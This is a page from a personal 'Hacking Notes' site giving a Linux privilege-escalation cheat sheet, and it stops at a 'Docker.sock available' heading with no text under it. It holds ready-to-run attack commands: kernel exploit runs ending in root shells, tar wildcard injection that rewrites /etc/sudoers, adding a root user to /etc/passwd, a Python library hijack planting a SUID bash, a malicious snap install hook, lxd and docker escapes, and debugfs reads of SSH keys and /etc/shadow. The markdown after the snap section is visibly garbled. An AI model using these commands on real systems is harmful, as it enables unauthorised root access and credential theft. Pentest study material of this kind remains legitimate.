<!DOCTYPE html>

<html>
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">

		<!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Linux Privesc | Hacking Notes</title>
<meta name="generator" content="Jekyll v3.8.4" />
<meta property="og:title" content="Linux Privesc" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Privilege Escalation usually involves going from a lower permission to a higher permission." />
<meta property="og:description" content="Privilege Escalation usually involves going from a lower permission to a higher permission." />
<link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/privilege-escalation/linux-privesc/" />
<meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/privilege-escalation/linux-privesc/" />
<meta property="og:site_name" content="Hacking Notes" />
<script type="application/ld+json">
{"description":"Privilege Escalation usually involves going from a lower permission to a higher permission.","url":"http://0.0.0.0:4000/hackingnotes/privilege-escalation/linux-privesc/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"Linux Privesc","@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->

		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />

		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
		<link rel="stylesheet" href="/hackingnotes/css/main.css">
		<link rel="apple-touch-icon" href="/hackingnotes/apple-touch-icon.png">
		<link rel="icon" type="image/png" href="/hackingnotes/touch-icon.png" sizes="192x192">
		<link rel="icon" type="image/png" href="/hackingnotes/images/favicon.png">

		
	</head>

	<body>
		<header>
			<h1>
				<a href="/hackingnotes/"><img src="/hackingnotes/images/emblem.svg" width="40" height="40" alt="Hacking Notes logo"></a>
				Hacking Notes
				<button type="button" class="open-nav" id="open-nav"></button>
			</h1>

			<form action="/hackingnotes/search/" method="get">
				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
				<input type="submit" value="Search" style="display: none;">
			</form>

			<nav class="full-navigation">
				<ul>
					<li class="nav-item top-level ">
						
						<a href="/hackingnotes/">What is this?</a>
					</li>
				</ul>

				<ul>
					
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/active-directory/domain-enumeration/">Active Directory</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-enumeration/">Domain Enumeration</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/client-side-attacks/evil-pdf/">Client Side Attacks</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/enumeration/host-discovery/">Enumeration</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/host-discovery/">Host Discovery</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/dns-enumeration/">DNS Enumeration</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/os-discovery/">OS Discovery</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/port-scanning/">Port Scanning</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/waf-evasion/">WAF Evasion</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/exploiting/buffer-overflow/">Exploiting</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/hacking-wifi/theory/">Hacking Wifi</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/theory/">Theory</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wep/">Hacking Wifi - WEP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-psk/">Hacking Wifi - WPA/WPA2 PSK</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-peap-enterprise/">Hacking Wifi - WPA/WPA2 PEAP (Enterprise)</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/other/hacking-aws/">Other</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/other/hacking-aws/">Hacking AWS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/other/hacking-with-powershell/">Hacking with PowerShell</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/post-exploitation/av-evasion/">Post Exploitation</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/av-evasion/">AV Evasion</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-uac/">Bypass UAC</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/get-credentials/">Gathering Credentials</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/password-cracking/">Password Cracking</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/port-forwarding/">Port Forwarding and Tunneling</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/reverse-shell/">Reverse Shell</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level current">
							
							<a href="/hackingnotes/privilege-escalation/linux-privesc/">Privilege Escalation</a>
							<ul>
								
									<li class="nav-item current"><a href="/hackingnotes/privilege-escalation/linux-privesc/">Linux Privesc</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/windows-privesc/">Windows Privesc</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/run-commands-as/">Run Commands As</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/reconnaissance/information-gathering/">Reconnaissance</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/reconnaissance/information-gathering/">Information Gathering</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/services/ftp/">Services</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/dns/">PORT 53/tcp - DNS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/http/">PORT 80/tcp, 443/tcp - HTTP Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/rpcbind/">PORT 111/tcp - RPCBind</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/imap/">PORT 143/tcp, 993/tcp - IMAP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/smb/">PORT 139/tcp, 445/tcp - SMB</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/snmp/">PORT 161/udp - SNMP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/java-rmi/">PORT 1100/tcp - Java RMI</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/sql-server/">PORT 1433/tcp - Microsoft SQL Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/nfs/">PORT 2049/tcp - NFS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/mysql/">PORT 3306/tcp - MySQL Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/rdp/">PORT 3389/tcp - RDP</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/software/wordpress/">Software</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/software/wordpress/">WordPress</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/drupal/">Drupal</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/tomcat/">Tomcat</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/web/file-inclusion/">Web</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/web/file-inclusion/">File Inclusion</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/login-panes/">Login Panes</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/sqli/">SQL Injection (SQLi)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/nosqli/">NoSQL Injection (NoSQLi)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/templates-injections/">Server Side Templates Injections (SSTI)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/unrestricted-file-upload/">Unrestricted File Upload</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/oauth-2.0-bypass/">OAuth 2.0 Bypass</a></li>
								
							</ul>
						</li>
					
				</ul>

				<ul>
					<li class="nav-item top-level ">
						
						<a href="/hackingnotes/changelog/">Change Log</a>
					</li>
				</ul>
			</nav>
		</header>

		<section class="main">
			<div class="page-header">
				<h2>Privilege Escalation</h2>
				<h3>Linux Privesc</h3>
			</div>
			<article class="content">
				<p>Privilege Escalation usually involves going from a lower permission to a higher permission.</p>

<h1 id="enumeration-scripts">Enumeration Scripts:</h1>

<p>There are some scripts that could help us in order to escalate privilege on Linux systems. These are two examples:</p>

<ul>
  <li><strong>LinEnum</strong>: <a href="https://github.com/rebootuser/LinEnum/">https://github.com/rebootuser/LinEnum/</a></li>
  <li><strong>LinPEAS</strong>: <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a>/</li>
</ul>

<h1 id="kernel-vulnerabilities">Kernel Vulnerabilities</h1>

<p>We can exploit some kernel vulnerabilities in order to privesc. <code class="highlighter-rouge">linux-exploit-suggester.sh</code> is an amazing script that do this work.</p>

<ul>
  <li><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./linux-exploit-suggester.sh
</code></pre></div></div>

<h2 id="compiling-exploits">Compiling Exploits</h2>

<p>Sometimes we need to compile our exploits in order to get the binary or executable.</p>

<p>For <strong>64-bits:</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc exploit.c -o exploit
</code></pre></div></div>

<p>For <strong>32-bits:</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -m32 exploit.c -o exploit

#i686 and older devices
gcc -march=i686 -m32 -Wl,--hash-style=both exploit.c -o exploit
</code></pre></div></div>

<p>Finally we just need to give execution permissions.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chmod u+x executablename
./executablename
</code></pre></div></div>

<h2 id="ebpf_verifier---linux-kernel--4139">eBPF_verifier - Linux Kernel &lt; 4.13.9</h2>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gcc cve-2017-16995.c -o cve-2017-16995
$ chmod +x cve-2017-16995

$ ./cve-2017-16995
[.]
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.]
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.]
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff =&gt; ffff88002dc42800
[*] Leaking sock struct from ffff88003d00d400
[*] Sock-&gt;sk_rcvtimeo at offset 472
[*] Cred structure at ffff8800354a0600
[*] UID from cred structure: 33, matches the current: 33
[*] hammering cred structure at ffff8800354a0600
[*] credentials patched, launching shell...

# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
</code></pre></div></div>

<ul>
  <li><a href="https://www.exploit-db.com/exploits/45010">https://www.exploit-db.com/exploits/45010</a></li>
</ul>

<h2 id="dirtyc0w---linux-kernel-2622--39">DirtyC0w - Linux Kernel 2.6.22 &lt; 3.9</h2>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -pthread dirty.c -o dirty -lcrypt
</code></pre></div></div>

<p>Transfer the exploit to the target machine.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chmod +x dirty
./dirty
</code></pre></div></div>

<ul>
  <li><a href="https://github.com/FireFart/dirtycow/blob/master/dirty.c">https://github.com/FireFart/dirtycow/blob/master/dirty.c</a></li>
</ul>

<h2 id="mempodipper---linux-kernel-2639--322-gentoo--ubuntu-x86x64">Mempodipper - Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo / Ubuntu x86/x64)</h2>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gcc mempodipper.c -o mempodipper
$ chmod +x mempodipper

$ ./mempodipper
===============================
=          Mempodipper        =
=           by zx2c4          =
=         Jan 21, 2012        =
===============================

[+] Waiting for transferred fd in parent.
[+] Executing child from child fork.
[+] Opening parent mem /proc/1977/mem in child.
[+] Sending fd 3 to parent.
[+] Received fd at 5.
[+] Assigning fd 5 to stderr.
[+] Reading su for exit@plt.
[+] Resolved exit@plt to 0x8049520.
[+] Calculating su padding.
[+] Seeking to offset 0x8049514.
[+] Executing su with shellcode.
# whoami
root
#
</code></pre></div></div>

<ul>
  <li><a href="https://www.exploit-db.com/exploits/18411">https://www.exploit-db.com/exploits/18411</a></li>
</ul>

<h2 id="abusing-suidguid-files">Abusing SUID/GUID Files</h2>

<p>Check for files with the SUID/GUID bit set. This means that the file or files can be <strong>run with permissions of the file(s) owner/group</strong>. In case of super-user, we can leverage this to get a shell with these privileges.</p>

<p>But when a special permission is given to each user it becomes SUID or SGID. When a extra bit “4” is set to user (Owner) it becomes SUID (Set user ID) and wen bit “2” is set to group it becomes SGID (Set Group ID).</p>

<p><strong>SUID:</strong> <code class="highlighter-rouge">rws-rwx-rws</code> <strong>GUID:</strong> <code class="highlighter-rouge">rwx-rws-rwx</code></p>

<table>
  <thead>
    <tr>
      <th style="text-align: center"><strong>Permission</strong></th>
      <th style="text-align: center"><strong>On Files</strong></th>
      <th style="text-align: center"><strong>On Directories</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">SUID Bit</td>
      <td style="text-align: center">User executes the file with permissions of the <em>file</em> owner.</td>
      <td style="text-align: center">-</td>
    </tr>
    <tr>
      <td style="text-align: center">SGID Bit</td>
      <td style="text-align: center">User executes the file with the permission of the <em>group</em> owner.</td>
      <td style="text-align: center">File created in directory gets the same group owner.</td>
    </tr>
    <tr>
      <td style="text-align: center">Sticky Bit</td>
      <td style="text-align: center">-</td>
      <td style="text-align: center">Users are prevented from deleting files from others users.</td>
    </tr>
  </tbody>
</table>

<p><img src="/hackingnotes/images/suid.png" alt="SUID, SGID and Sticky Bit" /></p>

<h2 id="finding-suid--guid-binaries"><strong>Finding SUID / GUID Binaries:</strong></h2>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -perm -u=s -type f 2&gt;/dev/null
find / -perm -g=s -type f 2&gt;/dev/null
</code></pre></div></div>

<h2 id="exploiting-path-variable">Exploiting PATH Variable</h2>

<p><code class="highlighter-rouge">PATH</code> is an environmental variable in Linux and Unix-like operating systems which specifies directories that hold executable programs. When the user runs any command in the terminal, it searches for executable files with the help of the <code class="highlighter-rouge">PATH</code> Variable in response to commands executed by a user.</p>

<p><strong>How does this let us escalate privileges?</strong></p>

<p>Let’s say we need an <strong>SUID binary</strong>. Running it, we can see that it’s calling the system shell to do a basic process like list processes with “ps”. We can rewrite the <code class="highlighter-rouge">PATH</code> variable to a location of our choice. So when the SUID binary calls the system shell to run an executable, it runs one that we have written instead. So we need to change the <code class="highlighter-rouge">PATH</code> variable:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export PATH=/tmp
echo $PATH
</code></pre></div></div>

<p>And create a file with execution permissions with the same binary name:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "/bin/bash" &gt; /tmp/ps
/bin/chmod +x /tmp/ps
</code></pre></div></div>

<p>Finally when the SUID files calls <code class="highlighter-rouge">ps</code> function, instead of showing system processes will execute our command.</p>

<blockquote>
  <p><strong>Remember</strong>: To exploit PATH variable <strong>we need a SUID File</strong> to gain privileges otherwise it will be executed as normal user.</p>
</blockquote>

<h1 id="writeable-folders">Writeable Folders</h1>

<p>We can elevate our privileges some times when we have write permissions in some specific directories.</p>

<blockquote>
  <p><strong>Note</strong>: With write permissions on the folder we can <strong>create/delete/move files</strong> but not modify them.</p>
</blockquote>

<h2 id="on-path-variable">On PATH variable</h2>

<p>When we can write on folders such as <code class="highlighter-rouge">/usr/local/bin</code> <code class="highlighter-rouge">/usr/bin</code> or some others that are included on the PATH variable we can escalate our privileges by <strong>modifying or creating a new binary</strong> that will be executed as <strong>root</strong>.</p>

<h3 id="ssh-port-open">SSH port open</h3>

<p>When we ssh a machine root executes <code class="highlighter-rouge">run-parts</code> binary so we add a malicious binary on the path. Look <a href="https://mvc1009.gitbook.io/hackingnotes/privilege-escalation/linux-privesc#executing-files-with-root">Executing files with root </a>to see which binary we can fit our needs.</p>

<h1 id="abusing-wildcards-">Abusing Wildcards (*)</h1>

<h2 id="tar-argument-injection-in-root-cronjob">Tar Argument Injection in root cronjob</h2>

<p>Imagine you compromise a low-level user on a system and you figure out this command is running as root:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /var/log/mon &amp;&amp; tar -zcf /tmp/mon.tar.gz *
</code></pre></div></div>

<p>We want to go with <strong>sudoers</strong> <strong>file</strong> as we are lazy and just sudo bash, so let’s see….</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 'echo "user ALL=(root) NOPASSWD: ALL" &gt; /etc/sudoers' &gt; privesc.sh
echo "" &gt; "--checkpoint-action=exec=sh privesc.sh"
echo "" &gt; --checkpoint=1
</code></pre></div></div>

<h1 id="writeable-etcpasswd">Writeable /etc/passwd</h1>

<p>The <code class="highlighter-rouge">/etc/passwd</code> file stores essential information, which is required during login. In other words, it stores user account information.</p>

<p>if we have a writable <code class="highlighter-rouge">/etc/passwd</code> file, we can write a new line entry allowing us to log in as our own root user. But first, we need to create a compliant password hash.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl passwd -1 -salt [username] [password]
openssl passwd [password]
</code></pre></div></div>

<p>Finally append the following string to <code class="highlighter-rouge">/etc/passwd</code> file:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[USERNAME]:[HASH]:0:0:root:/root:/bin/bash
</code></pre></div></div>

<p>And finally su to this new user to obtain a <strong>root</strong> <strong>shell</strong>:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su [USERNAME]
</code></pre></div></div>

<h1 id="gtfobins">GTFOBins</h1>

<p>GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p>

<p>Firstly, we need to check the sudo permissions on binaries:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -l
</code></pre></div></div>

<p>After that search on <a href="https://gtfobins.github.io">GTOBins web </a>to search how to escape from that binary and obtain a shell:</p>

<ul>
  <li><a href="https://gtfobins.github.io">https://gtfobins.github.io/</a></li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User user may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/someBinary
</code></pre></div></div>

<blockquote>
  <p><strong>Remember</strong>: Do <strong>not</strong> <strong>forget</strong> to run the command as <strong>sudo!</strong></p>
</blockquote>

<h2 id="setenv-permission">SETENV permission</h2>

<p>This mean that we can set some environment variables to run the command.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User user may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/some.py
</code></pre></div></div>

<p>Search for a library, create a copy in <code class="highlighter-rouge">/tmp</code> and execute commands.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>some.py

import sys
sys.exit(10)
</code></pre></div></div>

<p>We can create a sys.py file on <code class="highlighter-rouge">/tmp</code>.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import os
def exit(a):
        os.system("cp /bin/bash /tmp/rev")
        os.system("chmod u+s /tmp/rev")
</code></pre></div></div>

<p>Finally open the backdoor.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/tmp/rev -p
rev-4.4# id
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
</code></pre></div></div>

<h2 id="snap-install">Snap install</h2>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User user may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
</code></pre></div></div>

<p>When we find the following, we can install any malicious packet, so we will add our malicious personal crafted snap packet.</p>

<ul>
  <li><a href="https://ubuntu.com/tutorials/create-your-first-snap#3-building-a-snap-is-easy">https://ubuntu.com/tutorials/create-your-first-snap#3-building-a-snap-is-easy</a></li>
  <li><a href="https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html">https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html</a></li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir privesnap
cd privesnap
snapcraft init

touch snap/hooks/install
</code></pre></div></div>

<p>We need to create a malicious <code class="highlighter-rouge">snap/hooks/install</code> file, and modify <code class="highlighter-rouge">snap/snapcraft.yaml</code></p>

<ul>
  <li>install
```
#!/bin/bash</li>
</ul>

<h1 id="dirty_sockdirty_sock">dirty_sock:dirty_sock</h1>
<p>useradd dirty_sock -m -p ‘$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.’ -s /bin/bash
usermod -aG sudo dirty_sock
echo “dirty_sock    ALL=(ALL:ALL) ALL” » /etc/sudoers</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>* snapcraft.yaml
</code></pre></div></div>
<p>name: privesnap
version: ‘0.1’ 
summary: Empty snap, used for exploit
description: |
    See https://github.com/initstring/dirty_sock</p>

<p>grade: devel
confinement: devmode</p>

<p>parts:
  my-part:
    plugin: nil</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
# Linux Capabilities

&gt; Linux capabilities provide a subset of the available root privileges to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation.

</code></pre></div></div>
<p>getcap -r / 2&gt;/dev/null</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
Check the following link to see what means each capability:

* [https://man7.org/linux/man-pages/man7/capabilities.7.html#:~:text=Starting%20with%20kernel%202.2%2C%20Linux,are%20a%20per%2Dthread%20attribute.](https://man7.org/linux/man-pages/man7/capabilities.7.html#:~:text=Starting%20with%20kernel%202.2%2C%20Linux,are%20a%20per%2Dthread%20attribute.)

&gt; Note: **`ep`** capability means that can read and write any file on the filesystem.

More info in:

* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)

# Exploiting Crontab

The `Cron` daemon is a long-running process that executes commands at specific dates and times. You can use this to schedule activities, either as on-time events or as recurring tasks.

**To view what cronjobs are active** we need to cat the `/etc/crontab` file:

</code></pre></div></div>
<p>cat /etc/crontab</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
If we find a script that is scheduled to run as user root and we can write to this file, we can modify it to get a reverse shell when the cronjob run the task.

# Abusing privileges (Group memberships)

## sudo

Thats it, you're already root:

</code></pre></div></div>
<p>sudo su -</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
## lxd

A member of the local “lxd” group can instantly escalate the privileges to root on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even with the LXD snap package.

### With Internet

</code></pre></div></div>
<p>lxc init ubuntu:16:04 myimage -c security.privileged=true
lxc config device add myimage whatever disk source=/ path=/mnt/root recursive=true
lxc start test
lxc exec test bash</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
### Without Internet

Build an Alpine image and start it using the flag `security.privileged=true`, forcing the container to interact as root with the host filesystem.

</code></pre></div></div>
<h1 id="build-a-simple-alpine-image">build a simple alpine image</h1>
<p>git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i ‘s,yaml_path=”latest-stable/releases/$apk_arch/latest-releases.yaml”,yaml_path=”v3.8/releases/$apk_arch/latest-releases.yaml”,’ build-alpine
sudo ./build-alpine -a i686</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
Also you can download directly the image from ubuntu:

</code></pre></div></div>
<p>wget http://cloud-images.ubuntu.com/xenial/current/xenial-server-cloudimg-amd64-root.tar.xz
wget http://cloud-images.ubuntu.com/xenial/current/xenial-server-cloudimg-amd64-lxd.tar.xz
And exploit it:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
</code></pre></div></div>
<h1 id="import-the-image">import the image</h1>
<p>lxc image import ./alpine<em>.tar.gz –alias myimage # It’s important doing this from YOUR HOME directory on the victim machine, or it might fail.
lxc image import xenial-server-cloudimg-amd64-</em>.tar.xz –alias myimage # Or this depending if you downloaded</p>

<h1 id="before-running-the-image-start-and-configure-the-lxd-storage-pool-as-default">before running the image, start and configure the lxd storage pool as default</h1>
<p>lxd init</p>

<h1 id="run-the-image">run the image</h1>
<p>lxc init myimage mycontainer -c security.privileged=true</p>

<h1 id="mount-the-root-into-the-image">mount the /root into the image</h1>
<p>lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true</p>

<h1 id="interact-with-the-container">interact with the container</h1>
<p>lxc start mycontainer
lxc exec mycontainer /bin/sh</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
## adm

All members of the group `admin` have access to logs files:

</code></pre></div></div>
<p>/var/log/</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
## disk

All members of the gorup `disk` have full access to the filesystem.

</code></pre></div></div>
<p>df -h #search disk</p>

<p>debugfs /dev/sda1
debugfs: cd /root
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
We can also write files on the filesystem.

</code></pre></div></div>
<p>debugfs -w /dev/sda1
debugfs: dump file1.txt file2.txt  #Copy file1.txt to file2.txt</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
&gt; **Hint**: Files owned by root are now writable such as `/etc/passwd` or `/etc/shadow`.

## video

The video group has access to view the screen output of all opened sessions (tty). With `w` command we can see the who is logged on the server:

</code></pre></div></div>
<p>moshe@falafel:/var/log$ w
 17:35:42 up  3:40,  3 users,  load average: 0.22, 0.09, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      13:55    3:40m  0.05s  0.04s -bash
moshe    pts/0    10.10.14.20      17:18    0.00s  0.08s  0.00s w
moshe    pts/1    10.10.14.20      17:18   15:17   0.03s  0.03s bash</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
So we need to grab the video output and graphics configuration.

</code></pre></div></div>
<p>moshe@falafel:/var/log$ cat /dev/fb0 &gt; /tmp/screen.raw
moshe@falafel:/var/log$ cat /sys/class/graphics/fb0/virtual_size
1176,885</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
Finally we can open the data with GIMP.

![](/hackingnotes/images/video.png)

## docker

Since we are member of docker group, we can mount the root filesystem of the host machine to an instance's volume.

</code></pre></div></div>
<p>$ docker image ls
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
ubuntu              latest              775349758637        22 months ago       64.2MB
alpine              latest              965ea09ff2eb        22 months ago       5.55MB
centos              latest              0f3e07c0138f        23 months ago       220MB</p>

<p>$ docker run -it –rm -v /:/mnt <imagename> chroot /mnt bash</imagename></p>

<h1 id="edit-etcpasswd-to-get-root-access-to-the-host">Edit /etc/passwd to get root access to the host</h1>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
We can also mount the filesystem and the network access.

</code></pre></div></div>
<p>$ docker run –rm -it –pid=host –net=host –privileged -v /:/mnt <imagename> chroot /mnt bashbash</imagename></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
# Docker Breakout

## Privileged Flag enabled

When we start a docker with the privileged flag `--privileged` , we give the sufficient permission to mount the host filesystem inside the docker.

When the `root` user is owned, we will search the host drive:

</code></pre></div></div>
<p>fdisk -l</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
After finding the Linux sda we will mount it:

</code></pre></div></div>
<p>mkdir -p /mnt/host_drive
mount /dev/sda1 /mnt/host_drive</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
Finally, just `cd` to out new mount point to find all host files.

## Docker.sock available

